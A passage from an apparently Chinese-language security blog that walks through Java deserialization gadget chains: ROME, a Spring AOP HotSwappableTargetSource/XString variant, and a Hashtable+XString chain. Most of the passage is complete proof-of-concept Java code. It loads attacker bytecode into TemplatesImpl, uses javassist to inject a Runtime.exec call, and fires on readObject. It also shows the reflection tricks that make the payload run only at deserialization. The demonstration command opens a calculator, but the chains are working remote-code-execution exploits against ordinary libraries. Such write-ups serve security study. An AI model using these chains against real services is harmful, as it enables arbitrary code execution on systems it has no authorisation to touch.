这样不就已经对应了吗。这就与hash值相等有关系了，继续看后面。\nhash值相同的问题： 在前面也说过了，会传入两个HashMap类，所以会调用HashMap的父类AbstractMap的hashCode()方法，在CC7也有说过，过程中需要注意的点就是： 即在生成哈希码的时候需要考虑到key和value。\n毋庸置疑yy和zZ本身就已经哈希碰撞相同了。在我们之前的提出的疑问：为啥设置两个，这里就能给出答案：像前面那样只设置一个，key是相同了，但是这里的value是肯定不相同的。\n所以我们需要设置两个：\n1 2 3 4 5 6 7 HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); hashMap0.put(\u0026#34;yy\u0026#34;,impl); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,impl); hashMap1.put(\u0026#34;yy\u0026#34;,bean); ——————\n现在就可以尝试一下构造代码了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import javax.xml.transform.Templates; import java.util.Hashtable; import com.sun.syndication.feed.impl.ObjectBean; import java.util.HashMap; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ObjectBean bean = new ObjectBean(Templates.class,impl); Hashtable hash = new Hashtable(); HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); hashMap0.put(\u0026#34;yy\u0026#34;,impl); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,impl); hashMap1.put(\u0026#34;yy\u0026#34;,bean); hash.put(hashMap0,1); hash.put(hashMap1,1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 运行后只弹出一个计算机，那么只能是序列化的时候弹出来的，打断点调试一下，发现确实是都没有进入序列化部分，并且是无法放入第二个键值对的：\n解决方法，还是反射更改，代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import javax.xml.transform.Templates; import java.util.Hashtable; import com.sun.syndication.feed.impl.ObjectBean; import java.util.HashMap; import com.sun.syndication.feed.impl.EqualsBean; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); EqualsBean bean = new EqualsBean(String.class,\u0026#34;fupanc\u0026#34;); Hashtable hash = new Hashtable(); HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); hashMap0.put(\u0026#34;yy\u0026#34;,impl); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,impl); hashMap1.put(\u0026#34;yy\u0026#34;,bean); hash.put(hashMap0,1); hash.put(hashMap1,1); setFieldValue(bean,\u0026#34;_beanClass\u0026#34;,Templates.class); setFieldValue(bean,\u0026#34;_obj\u0026#34;,impl); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 简单说明一下，EqualsBean类不用说了，就是ObjectBean类实例用的那个。ObjectBean类的equals()方法也是指向的我们要利用的那个： 对于反射修改，还是很妙的，直接在下面这一步就断出去了并且没有影响基本的赋值问题： 因为传入的TemplatesImpl类实例和String.class不是相对应的，所以没有进入下面的加载字节码的过程。直接讲eq赋值为了false，并且在最后是返回了这个值的：\n也就是说这里调用equals()方法后最后返回的是false，成功放入了第二个键值对，不会覆盖：\n非常妙，同时传入fupanc，是为了让equalsBean能够成功实例化：\n所以最终POC为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import javax.xml.transform.Templates; import java.util.Hashtable; import com.sun.syndication.feed.impl.ObjectBean; import java.util.HashMap; import com.sun.syndication.feed.impl.EqualsBean; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); EqualsBean bean = new EqualsBean(String.class,\u0026#34;fupanc\u0026#34;); Hashtable hash = new Hashtable(); HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,bean); hashMap0.put(\u0026#34;yy\u0026#34;,impl); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,impl); hashMap1.put(\u0026#34;yy\u0026#34;,bean); hash.put(hashMap0,1); hash.put(hashMap1,1); setFieldValue(bean,\u0026#34;_beanClass\u0026#34;,Templates.class); setFieldValue(bean,\u0026#34;_obj\u0026#34;,impl); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功按照预期弹出一个计算机，调试也没问题。\nOK，ROME链完结。\n最后，需要注意的是： 这个rome链虽然是获取到getter和setter方法，但是从利用代码层面是只能调用到getter，自己分析是这样，具体就自己调试看看，也不难。\n其他链 同样的可以算是另外的触发toString()方法的类，注意串通不同的知识点。\nHotSwappableTargetSource 这个类位于org.springframework.aop.target.HotSwappableTargetSource，是spring AOP下的一个类，主要的点还是可以调用到toString()方法，现在来跟一下这里的过程。\n需要加一个spring-boot的依赖：\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-aop\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.2.7.RELEASE\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 在这里会利用到HotSwappableTargetSource类的equals()方法：\n可以看到这里是会调用到equals()方法，老朋友了，然后这里调用了this.target，这个参数是可控的：\n所以这里都是可控的，并且是将这里的target变量类型是object，所以是可以进行任意变量的赋值。\n总结来说就是可以调用任意类的equals()方法，在这里是选择的XString类的equals()方法，这个类位于com.sun.org.apache.xpath.internal.objects.XString，现在来看一下这里选择的方法：\n可以调用toString()方法，然后这里拼接上前面的rome链的toString链即可。\n调用到equals()方法的，我看网上似乎都是用的HashMap作为反序列化出发点，触发的地方就在putVal()方法：\n我觉得这里触发点的点就是图中标注出来的，刚好之前没利用过这里的putVal()方法来触发equals()方法，这里来简单构造一下。\n其实可以先简单代码跟进构造一下，绕不过的一点就是需要hash值相同的，在调用hash()方法时会调用到hashCode()方法来进行hash值的计算，从代码跟进中可以知道这里的key是需要为HotSwappableTargetSource类实例的，正巧这个类是定义了hashCode()方法的：\n这个点就非常有意思了，大概就是无论这个类中写入了什么，只要对这个类调用hashCode()方法，返回的结果都是相同的，所以这里是可以直接利用的，然后就可以简单写一个代码来进行调试分析：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 package org.example; import java.lang.reflect.Field; import java.util.HashMap; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.springframework.aop.target.HotSwappableTargetSource; import com.sun.org.apache.xpath.internal.objects.XString; import javassist.*; import com.sun.syndication.feed.impl.ObjectBean; import javax.xml.transform.Templates; public class Main{ public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,code); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ObjectBean x1 = new ObjectBean(Templates.class,impl); XString xString = new XString(\u0026#34;fupanc\u0026#34;); HotSwappableTargetSource ho1 = new HotSwappableTargetSource(xString); HotSwappableTargetSource ho2 = new HotSwappableTargetSource(x1); HashMap hm = new HashMap(); hm.put(ho2,1); hm.put(ho1,1); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 运行就直接弹出计算机了，那么就是在第二次put进值时弹的计算机，现在打断点来进行调试。\n发现是直接在如下的equals()方法就调用到了HotSwappableTargetSource类的equals()方法：\n前面那个p就是赋值为前一个放进去的值，然后后面会调用p来获取到他的hash值等操作。\n在调用到equals()方法前，虽然两个HotSwappableTargetSource类实例的hash值相同，但是很明显本质的内容是不同的，然后会调用到equals()方法:\n然后调用到XString类的equals()方法：\n然后就会调用到ObjectBean类的toString()方法，随后的过程就是前面toString链说过的了，后面过程就不再多说了，最后返回了false。\n对于equals()方法调用结束为false，这里简单说说就行了：\n两个HotSwappableTargetSource类实例肯定不同，然后符合instances，然后调用equals()方法：\n这里的str()就是返回前面实例化传参的fupanc，然后这里调用了toString()方法，这里返回的结果是不会相同的，所以两个字符串比较是肯定会被直接判定为false，最后综合下来，这整个调用的equals()方法返回false，最后让整个if条件判断为false。也是符合预期的。\n继续跟进putVal()方法的后续代码，方法定义如下：\n其实具体过程都是和Hashtable那里相同的，在这里的话，虽然hash相同，但是两个实例化对象是肯定不同的，对于后面的equals()方法调用，参考到Hashtable类的equals()调用，应该是需要这里的值不相同，然后key又被判定为不同，这样就可以放入两个值，\n因为HashMap等控制键值对的类其本质其实都是让一个内部类Node来进行的存储，所以最后的目的肯定是要实例话一个Node类的，也就是图中的newNode()方法：\n所以需要规避掉上面的更新值的操作，也就是需要e为null，看上面代码，我们可以控制调用完equals()方法后返回一个false，也就回让整个if条件返回一个false，然后else if肯定也是false，进入到了else语句，先判断if语句，p.next就是获取下一个键值对，那么这里肯定为null。然后这的binCount又为0，肯定不可能大于7，变量定义如下：\n所以直接break，然后结束，最后这个e也为null，可以往里面放第二个键值对。其实直接接着前面的测试代码调试即可，主要的生效代码就是：\n这个地方将p.next设置为了下一个Node，也就是成功放入了下一个键值对，所以总的来说，基本只要满足前面的equals()方法判定为false，就可以放进去一个新的键值对。\n反序列化也是调用的putVal()方法，所以其实也基本过了，这里就不多说了。序列化前不弹出计算机，其实直接像ROME链那样改就行了，然后反射修改，具体过程可以自己去跟跟，还是先尝试不换呢？尝试的POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 package org.example; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.ToStringBean; import org.springframework.aop.target.HotSwappableTargetSource; import com.sun.org.apache.xpath.internal.objects.XString; import javassist.*; import com.sun.syndication.feed.impl.ObjectBean; import javax.xml.transform.Templates; public class Main{ public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,code); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ToStringBean x1 = new ToStringBean(Templates.class,impl); XString xString = new XString(\u0026#34;fupanc\u0026#34;); HotSwappableTargetSource ho1 = new HotSwappableTargetSource(xString); HotSwappableTargetSource ho2 = new HotSwappableTargetSource(x1); HashMap hm = new HashMap(); hm.put(ho2,1); hm.put(ho1,1); // setFieldValue(x1,\u0026#34;_beanClass\u0026#34;,Templates.class); // setFieldValue(x1,\u0026#34;_obj\u0026#34;,impl); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hm); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 只弹出一个计算机，预期应该是两个，同时也报错：\n1 2 3 4 5 6 Exception in thread \u0026#34;main\u0026#34; java.lang.ClassNotFoundException: Evil at java.net.URLClassLoader.findClass(URLClassLoader.java:381) at java.lang.ClassLoader.loadClass(ClassLoader.java:424) at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:331) at 。。。。。。 我用javassist写的Evil类有问题？感觉可能和前面CC几当时提出的问题有点像，但是这里发现是反序列化一部分报的错，没调出来，那还是换吧，最后的POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 package org.example; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.ToStringBean; import org.springframework.aop.target.HotSwappableTargetSource; import com.sun.org.apache.xpath.internal.objects.XString; import javassist.*; import com.sun.syndication.feed.impl.ObjectBean; import javax.xml.transform.Templates; public class Main{ public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,code); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ToStringBean x1 = new ToStringBean(String.class,\u0026#34;fupanc\u0026#34;); XString xString = new XString(\u0026#34;fupanc\u0026#34;); HotSwappableTargetSource ho1 = new HotSwappableTargetSource(xString); HotSwappableTargetSource ho2 = new HotSwappableTargetSource(x1); HashMap hm = new HashMap(); hm.put(ho2,1); hm.put(ho1,1); setFieldValue(x1,\u0026#34;_beanClass\u0026#34;,Templates.class); setFieldValue(x1,\u0026#34;_obj\u0026#34;,impl); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hm); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 只在反序列化时弹出计算机。成功调用到ToStringBean类的toString()方法：\n这里是直接返回读出来的字节，所以上一步的XString的equals()方法判断都是肯定不相同的，只是有点不清楚为什么Evil这里会报错找不到？可能还是和序列化问题相关吧。\n参考文章的绕过方式也行，如下POC：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 package org.example; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.ToStringBean; import org.springframework.aop.target.HotSwappableTargetSource; import com.sun.org.apache.xpath.internal.objects.XString; import javassist.*; import com.sun.syndication.feed.impl.ObjectBean; import javax.xml.transform.Templates; public class Main{ public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,code); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ToStringBean x1 = new ToStringBean(Templates.class,impl); XString xString = new XString(\u0026#34;fupanc\u0026#34;); HashMap hash = new HashMap(); hash.put(\u0026#34;haha\u0026#34;,\u0026#34;haha\u0026#34;); HotSwappableTargetSource ho1 = new HotSwappableTargetSource(xString); HotSwappableTargetSource ho2 = new HotSwappableTargetSource(hash); HashMap hm = new HashMap(); hm.put(ho2,1); hm.put(ho1,1); setFieldValue(ho2,\u0026#34;target\u0026#34;,x1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hm); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 在XString类的equals()方法调用toString()方法时，调用的会是HashMap类的toString()方法，但其实都大差不差的，这里就不多说了。\nHashtable类也行吧应该，hash值相等这么容易，可以用来绕过HashMap的限制。\n最后，在其他链子的学习中，我注意到同一个包下的另外一个类SingletonTargetSource，路径为org.springframework.aop.target.SingletonTargetSource，这个类实现了Serializable接口，可以被用来序列化。关注到这个类的equals()方法：\n这里的that是jdk16引入的一个机制，就是前面判断的instanceof为true就回讲other设置为that，所以其实和前面HotSwappableTargetSource类的equals()方法实现的基本逻辑是一样的，只是我这里用的SpringAOP的版本不同，可能主要是因为这个依赖就是写给jdk16及以上来使用的吧。这里也说明了一个东西，在做题时看到的不同版本的依赖也是可以尝试利用的。就懒得改成这篇文章的依赖版本了。\n————————\nHashtable+XString链 前面利用到了XString类的equals()方法，这个类位于com.sun.org.apache.xpath.internal.objects.XString。既然都是利用equals()方法了，简单想了一下思路，其实也是和前面这个差不多了，但是就利用而言更多的是这里的XString起了一个中转的作用，在ROME链中的本来思路是equals()方法就可以直接打getter从而进行命令执行了，在这里的话就简单以一个XString触发ROME链中的toString链来进行分析，但是需要注意的是，XString不是ROME中特有的链，所以在其他地方也是可以利用的，比如jackson或者fastjson等。\n具体思路其实也已经很清楚了，过程也已经非常清晰了，基本盘就是如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import javax.xml.transform.Templates; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.syndication.feed.impl.ToStringBean; import com.sun.org.apache.xpath.internal.objects.XString; import javassist.*; import java.util.HashMap; import java.util.Hashtable; public class Main{ public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,code); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ToStringBean x1 = new ToStringBean(Templates.class,impl); XString xString = new XString(\u0026#34;fupanc\u0026#34;); Hashtable hash = new Hashtable(); HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,xString); hashMap0.put(\u0026#34;yy\u0026#34;,x1); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,x1); hashMap1.put(\u0026#34;yy\u0026#34;,xString); hash.put(hashMap0,\u0026#34;1\u0026#34;); hash.put(hashMap1,\u0026#34;2\u0026#34;); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 我这里是选用的Hashtable类作为入口类，这个类的关于键值对的处理比较清晰。这里也不用再分析了，过程太熟悉了，唯一的问题就是看Hashtable中是否可以第二次正常放入键值对，并且达到只在反序列化时弹出计算机，而序列化时不弹出计算机。\n但是这里其实也是和前面的HotSwappableTargetSource有点像，对于是否可以存储进两个值，当Hashtabel类put进第二个值时，会调用到HashMap的父类AbstractMap的equals()方法：\n从而可以调用到XString类的equals()方法：\n这里进行的obj2.toString()调用，最后返回的是报错信息：\n然后肯定不会和实例化XString时传入的fupanc相同，返回false：\n最后返回false，从而可以成功放入两个键值对。\n其实都是说过了的，其他不多说了，poc如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import javax.xml.transform.Templates; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.syndication.feed.impl.ToStringBean; import com.sun.org.apache.xpath.internal.objects.XString; import javassist.*; import java.util.HashMap; import java.util.Hashtable; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,code); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ToStringBean x1 = new ToStringBean(Templates.class,impl); XString xString = new XString(\u0026#34;fupanc\u0026#34;); Hashtable hash = new Hashtable(); HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,xString); hashMap0.put(\u0026#34;yy\u0026#34;,x1); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,x1); hashMap1.put(\u0026#34;yy\u0026#34;,xString); hash.put(hashMap0,\u0026#34;1\u0026#34;); hash.put(hashMap1,\u0026#34;2\u0026#34;); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = 